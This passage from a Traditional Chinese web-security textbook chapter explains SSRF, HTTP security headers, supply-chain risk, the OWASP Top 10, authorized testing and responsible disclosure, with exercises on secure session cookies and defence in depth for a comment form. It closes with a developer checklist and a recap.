SSRF(Server-Side Request Forgery)是近年竄升、在雲端時代特別致命的漏洞。 若你的後端會「根據使用者提供的網址去抓東西」(例如「輸入圖片 URL,我幫你下載縮圖」), 而沒有限制目標,攻擊者就能誘使你的伺服器去存取它本不該碰的位址——尤其是 內網位址(如 http://localhost、其他內部服務)或雲端的中繼資料服務 (那裡常藏著存取憑證)。注意這裡被「偽造請求」的是伺服器,它的網路位置往往比外部攻擊者特權得多。 防禦:對使用者提供的 URL 做白名單(只允許特定網域/協定)、解析後檢查是否指向內網與保留位址、 在網路層面隔離後端的對外連線。SSRF 也名列 OWASP Top 10。

安全標頭總覽

前面零散出現了好幾個 HTTP 安全標頭,它們是「設定一次、全站受惠」的高 CP 值防線。整理成一張可貼在牆上的表:

標頭作用範例值 / 擋什麼
Content-Security-Policy限制可載入/執行的資源來源default-src 'self'(擋 XSS)
Strict-Transport-Security強制只走 HTTPS(HSTS)max-age=31536000; includeSubDomains(擋降級/MITM)
X-Frame-Options / frame-ancestors禁止被嵌進 iframeDENY(擋點擊劫持)
X-Content-Type-Options禁止瀏覽器「猜」內容型別(MIME sniffing)nosniff
Referrer-Policy控制 Referer 外洩多少資訊strict-origin-when-cross-origin
Set-Cookie(屬性)鎖好 cookieHttpOnly; Secure; SameSite=Lax

相依套件與供應鏈漏洞

現代 Web 專案,你自己寫的程式碼可能只佔一小部分,其餘是幾百個第三方套件(npm、pip、Maven……)。 每一個套件,都是你信任鏈上的一環——只要其中一個有已知漏洞,或被惡意接管(供應鏈攻擊), 你的網站就跟著中招。這正是 OWASP「使用有漏洞的元件」與「軟體完整性失敗」要談的(呼應第 36 章)。 防禦:用 SCA(相依套件掃描)工具(npm audit、pip-audit、Dependabot)持續比對已知漏洞、 鎖定版本、定期更新、移除用不到的相依。你的安全,等於你最弱的那個相依套件的安全。

OWASP Top 10 的 Web 視角

把這一章串起來看,你會發現它幾乎就是 OWASP Top 10 的導覽。OWASP(Open Worldwide Application Security Project)整理的這份清單,是 Web 安全最權威的「自我檢查起點」——每次設計或審查網站, 都可以拿它逐條問「我這裡守住了嗎?」下表用 Web 的視角,把 2021 版十大類別對應到本章的小節:

代號類別Web 視角一句話本章對應
A01權限控制失當改網址/參數就越權看別人資料(IDOR)、管理端點沒檢查權限授權一節
A02加密機制失敗沒上 HTTPS、混合內容、明文存密碼、弱雜湊傳輸安全 / 認證
A03注入SQL/命令注入、XSS——資料被當指令XSS / 注入

A05安全設定錯誤少了安全標頭、CORS 開太大、debug 上線、預設密碼CORS / 安全標頭
A06使用有漏洞的元件前端/後端相依套件帶著已知漏洞供應鏈一節

你也許注意到了:CSRF 沒有單獨列在 2021 版 Top 10 裡。這不是因為它不重要,而是因為現代框架的 CSRF token 與瀏覽器預設的 SameSite 已經把它壓制得相當好—— 但前提是你真的有用這些防護。這正好說明一件事:清單會變,原則不變。

🔑
縱深防禦,在 Web 的具體樣貌

回顧整章,你會發現同一個漏洞我們總是疊好幾層防:XSS 用「輸出編碼 + CSP + HttpOnly」; CSRF 用「token + SameSite + 敏感操作再驗證」;注入用「參數化 + 輸入驗證 + 最小權限」; 傳輸用「HTTPS + HSTS + 杜絕混合內容」。這就是縱深防禦(defense in depth)在 Web 的實踐—— 不假設任何單一防線不會失守,層層設防,一層破了還有下一層。這條心法(第 34、36 章)是貫穿整部資安的脊梁。

安全開發與測試:授權前提下的攻防

漏洞防得再熟,人還是會錯。成熟的團隊把安全系統化地織進開發流程,而不是上線後出事才補。

  • 威脅建模(threat modeling):在設計階段就像攻擊者一樣思考——畫出資料流、標出 信任邊界、用 STRIDE 之類的方法逐項拷問「這裡會被誰、怎麼攻擊?」。改設計最便宜的時機,就是它還在白板上時(第 34 章)。
  • 滲透測試與漏洞掃描(授權前提):用 DAST 工具(OWASP ZAP、Burp Suite)對「執行中」的網站主動探測, 或請專業團隊做滲透測試。但這一切都必須在明確的書面授權範圍內進行。想動手練, 請用合法、自架的靶場——OWASP Juice Shop、DVWA、PortSwigger 的 Web Security Academy 都是專門讓你安全地實驗攻防的環境,絕不要對未授權的真實系統出手。
  • 把安全測試融入 CI:SAST(掃原始碼)、SCA(掃相依套件)、DAST(掃執行中應用) 應該像單元測試一樣自動跑在每次 commit/部署(第 18、36 章)。

Bug bounty 與負責任揭露

如果你無意間發現了某個別人網站的漏洞,正確的做法不是利用它、也不是公開炫耀, 而是負責任的揭露(responsible disclosure):私下通知對方、清楚說明問題、給予合理的修補時間, 修好後再(在對方同意下)公開。許多公司還設有 bug bounty(漏洞賞金)計畫, 在明訂的規則與範圍內歡迎、甚至獎勵安全研究者回報漏洞——這把「找漏洞」變成一件合法且雙贏的事。 但務必看清楚計畫的範圍(scope):超出授權範圍的探測,即使出於善意,依然可能違法。

⛔
守住那條線

這一章教你看穿 Web 漏洞、理解攻擊。請牢牢記住:這些能力的正當用途只有兩個—— 把你自己(與你受僱保護)的網站寫得更安全,以及在明確獲得授權的範圍內做安全測試。 未經授權去探測、攻擊任何不屬於你的網站,即使「只是看看」、即使沒造成損害,在絕大多數司法管轄區都是犯罪。 技術是中性的,讓它成為盾而非矛,是工程師的職業倫理底線。我們在第 41 章「計算倫理」會正式深入。

✏️ 練習 52.4 實作

你要為一個網路銀行設計「登入後」發給瀏覽器的 session cookie。請寫出你會用的完整 Set-Cookie(挑出該加的屬性),並逐一說明每個屬性擋掉哪一種攻擊。 另外說明:除了 cookie 屬性,你在「登入成功的那一刻」還會做哪一個關鍵動作?

看解答 
Set-Cookie: session=<CSPRNG 產生的長隨機值>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=900
  • 值用 CSPRNG 產生、夠長:不可預測,擋住「猜 session ID」與 session fixation 的可預測性。
  • HttpOnly:JavaScript 讀不到此 cookie,即使網站被 XSS 攻陷,腳本也偷不走 session。
  • Secure:只在 HTTPS 上傳送,擋住明文連線上的竊聽(session 劫持)。
  • SameSite=Lax(銀行可考慮 Strict):跨站請求不自動帶上此 cookie,擋住 CSRF。
  • Path=/ 限定範圍、Max-Age=900(15 分鐘):縮短通行證有效窗口,降低被劫持後的濫用時間。

關鍵動作:登入成功的那一刻,重新產生 session ID(丟掉登入前的舊 ID、發一個全新的)—— 這直接消滅 session fixation。最後,別忘了全站走 HTTPS、加上 HSTS,讓 Secure 真正有意義。

✏️ 練習 52.5 挑戰

有一個極簡的「留言板」:任何登入使用者可在表單填入留言並送出(POST /comment), 所有留言會顯示在公開頁面上,留言存進資料庫。請為這個小表單,從輸入到輸出、從前端到傳輸, 列出一套完整的縱深防禦措施,並標明每一條各防的是哪一類攻擊。

看解答

一個留言板麻雀雖小,五臟俱全,幾乎踩遍本章每個主題。一套縱深防禦可以是:

  1. 傳輸:全站 HTTPS + HSTS,杜絕混合內容。→ 擋竊聽 / MITM / 降級。
  2. 輸入驗證(信任邊界、白名單):限制留言長度與允許字元、拒絕空白。→ 擋過大輸入、減少注入面。
  3. 存入資料庫用參數化查詢。→ 擋 SQL 注入。
  4. 輸出編碼:顯示留言時對 < > & " ' 做 HTML 編碼(用模板的自動編碼)。→ 擋儲存型 XSS。
  5. CSP:default-src 'self'。→ 萬一漏了一個編碼,擋住注入腳本執行(XSS 第二層)。
  6. 送出表單要帶 CSRF token,核對才處理;session cookie 設 SameSite=Lax。→ 擋 CSRF(防止別站偽造「代發留言」)。
  7. session cookie 設 HttpOnly; Secure。→ 即使被 XSS,也偷不走 session;只走 HTTPS。
  8. 授權檢查:「刪除/編輯留言」要在伺服器端確認操作者是該留言作者(或管理員),不能只靠前端隱藏按鈕。→ 擋 IDOR / 越權。
  9. 速率限制(rate limiting):限制每人每分鐘留言數。→ 擋洗版 / 濫用(可用性)。
  10. 安全標頭 + 相依套件掃描 + 日誌監控。→ 設定面、供應鏈(A06)、被入侵的早期偵測(A09)。

注意每一條都對應到本章一個段落,而且沒有任何單獨一條能「包辦全部」——這正是縱深防禦的本質: 一個功能、多層保護,任何一層失守,還有下一層接著。

給開發者的 Web 安全檢查清單

把整章濃縮成一張可以在每次開發、每次 code review 時拿出來逐條問的清單:

  • 輸出一律編碼:任何使用者資料進 HTML/JS/URL 前先編碼;順著框架的自動編碼走,警惕 innerHTML / dangerouslySetInnerHTML。
  • 查詢一律參數化:SQL 用 prepared statement,命令用參數陣列、不經 shell;資料庫帳號最小權限。
  • 狀態變更防 CSRF:CSRF token + SameSite cookie;GET 只讀不改狀態;敏感操作再驗證密碼。
  • 每個敏感操作都做伺服器端授權檢查:確認「這個人能碰這筆資源/這個功能嗎」;絕不靠前端隱藏。
  • cookie 鎖好:HttpOnly; Secure; SameSite;session ID 用 CSPRNG、登入時重新產生、設逾時。
  • 密碼安全儲存:bcrypt/scrypt/Argon2 加鹽慢雜湊;提供 MFA。
  • 全程 HTTPS:加 HSTS,杜絕混合內容,憑證有效。
  • 設好安全標頭:CSP、HSTS、X-Frame-Options、X-Content-Type-Options、Referrer-Policy。
  • CORS 最小開放:只白名單信任來源,私密+帶憑證的 API 絕不用 *。
  • 驗證重新導向目標、限制 SSRF 的對外請求:跳轉只允站內;後端抓 URL 要白名單、擋內網。
  • 管好相依套件:持續掃描已知漏洞、鎖版本、定期更新、移除無用相依。
  • 錯誤訊息對外沉默、對內詳盡;關閉生產環境 debug;記錄與監控到位。
  • 安全織進流程:威脅建模、SAST/DAST/SCA 進 CI、code review 帶安全意識;測試只在授權範圍內。

把這一章串起來

我們從「瀏覽器甘願執行陌生程式碼」這個瘋狂又必要的前提出發,走過了 Web 攻防的全景。回顧路標:

  • 一切的基石是同源政策:它隔離不同來源,默默擋掉無數攻擊;CORS 是由伺服器主動授權、受控放寬的一扇門,而不是拆掉整道牆。
  • XSS(反射/儲存/DOM)是「資料變腳本」:用輸出編碼 + CSP + HttpOnly 三層防。
  • CSRF 借用你已登入的瀏覽器代發請求:用 CSRF token + SameSite cookie 擋它;SameSite=Lax 截斷了「跨站背景請求自動帶 cookie」這條命脈。
  • 注入(SQL/命令)在 Web 同樣致命:參數化 + 輸入驗證 + 最小權限。
  • 認證與工作階段:session 是通行證,要防劫持與固定;cookie 屬性鎖好;密碼加鹽慢雜湊;鼓勵 MFA。
  • 授權是 OWASP 第一名的洞:IDOR、越權、功能級存取缺失;每個敏感操作都要伺服器端檢查,「藏按鈕」不是安全。
  • 傳輸與其他:HTTPS/HSTS/憑證、杜絕混合內容;點擊劫持、開放重新導向、SSRF、安全標頭、供應鏈——各有對策。
  • 心法不變:縱深防禦、最小權限、安全預設、失敗時安全;把安全變成流程;以及那條不可逾越的倫理與授權界線。

Web 安全沒有「完成」的一天——攻擊手法會推陳出新,但你現在握有的,是比任何單一招式都珍貴的東西: 一雙能看穿「資料」與「指令」、「認證」與「授權」、「同源」與「跨站」界線的眼睛, 以及一顆「這裡的信任,放對了嗎?」的偵探之心。帶著它們,你寫的每一個網頁,都會比昨天更值得被信任一點。
